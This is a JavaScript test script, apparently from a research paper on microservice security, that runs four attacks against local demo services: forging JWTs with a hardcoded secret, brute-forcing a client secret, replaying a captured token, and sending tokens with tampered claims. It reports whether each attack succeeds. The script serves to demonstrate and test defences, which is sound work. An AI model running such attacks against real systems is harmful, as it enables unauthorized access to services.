/**
 * Run all attack demonstrations sequentially
 * Tests both vulnerable and secure configurations
 */

const { execSync, spawn } = require("child_process");
const http = require("http");

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function makeRequest(options) {
  return new Promise((resolve) => {
    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve({ status: res.statusCode, body: data }));
    });
    req.on("error", (err) => resolve({ status: 0, body: err.message }));
    req.end();
  });
}

async function runAllAttacks() {
  console.log("╔══════════════════════════════════════════════════════════════╗");
  console.log("║  MICROSERVICES SECURITY - ATTACK DEMONSTRATION SUITE         ║");
  console.log("║  Research Paper: Securing Inter-Service Communication         ║");
  console.log("╚══════════════════════════════════════════════════════════════╝\n");

  const jwt = require("jsonwebtoken");
  const SECRET = "SUPER_SECRET";

  // ── ATTACK 1: Token Forgery ───────────────────────────────────────────────
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("ATTACK 1: TOKEN FORGERY");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  const forgedToken = jwt.sign({ typ: "service", service: "attacker" }, SECRET);
  console.log("[*] Generated forged token using hardcoded secret");

  let result = await makeRequest({
    hostname: "localhost", port: 4000, path: "/orders", method: "GET",
    headers: { Authorization: `Bearer ${forgedToken}` }
  });
  console.log(`[*] Result against Order Service: HTTP ${result.status}`);
  console.log(result.status === 200
    ? "[!] VULNERABLE - Forged token accepted"
    : "[+] SECURE    - Forged token rejected");

  await wait(500);

  // ── ATTACK 2: Brute Force ─────────────────────────────────────────────────
  console.log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("ATTACK 2: BRUTE-FORCE");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  const guesses = ["123456", "admin", "password", "order_secret"];
  let bruteResult = null;

  for (const guess of guesses) {
    const r = await makeRequest({
      hostname: "localhost", port: 3000, path: "/service-token", method: "POST",
      headers: {
        "x-client-id": "order_service",
        "x-client-secret": guess,
        "Content-Type": "application/json"
      }
    });

    if (r.status === 429) {
      console.log(`[+] SECURE    - Rate limited after attempt with "${guess}"`);
      bruteResult = "SECURE";
      break;
    } else if (r.status === 200) {
      console.log(`[!] VULNERABLE - Credential found: "${guess}"`);
      bruteResult = "VULNERABLE";
      break;
    } else {
      console.log(`[-] Failed attempt: "${guess}" (${r.status})`);
    }
    await wait(200);
  }

  await wait(500);

  // ── ATTACK 3: Replay Attack ───────────────────────────────────────────────
  console.log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("ATTACK 3: REPLAY ATTACK");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  const capturedToken = jwt.sign({ typ: "service", service: "order_service" }, SECRET);
  console.log("[*] Simulating captured token, replaying 3 times...");

  for (let i = 1; i <= 3; i++) {
    const r = await makeRequest({
      hostname: "localhost", port: 4000, path: "/orders", method: "GET",
      headers: { Authorization: `Bearer ${capturedToken}` }
    });

    if (r.status === 200) {
      console.log(`[!] Attempt ${i}: ACCEPTED (VULNERABLE)`);
    } else {
      console.log(`[+] Attempt ${i}: BLOCKED - ${r.body} (SECURE)`);
    }
    await wait(300);
  }

  // ── ATTACK 4: Weak Validation ─────────────────────────────────────────────
  console.log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("ATTACK 4: WEAK VALIDATION");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  const manipulated = jwt.sign(
    { typ: "service", service: "attacker", iss: "evil", aud: "anything" },
    SECRET
  );
  console.log("[*] Testing manipulated token claims...");

  const r4 = await makeRequest({
    hostname: "localhost", port: 4000, path: "/orders", method: "GET",
    headers: { Authorization: `Bearer ${manipulated}` }
  });
  console.log(r4.status === 200
    ? "[!] VULNERABLE - Manipulated claims accepted"
    : `[+] SECURE    - Manipulated claims rejected (${r4.body})`);

  // ── Summary ───────────────────────────────────────────────────────────────
  console.log("\n╔══════════════════════════════════════════════════════════════╗");
  console.log("║  ATTACK DEMONSTRATION COMPLETE                               ║");
  console.log("╚══════════════════════════════════════════════════════════════╝");
  console.log("\nRun against VULNERABLE services to see attacks succeed.");
  console.log("Run against SECURE services to see mitigations in action.\n");
}

runAllAttacks().catch(console.error);
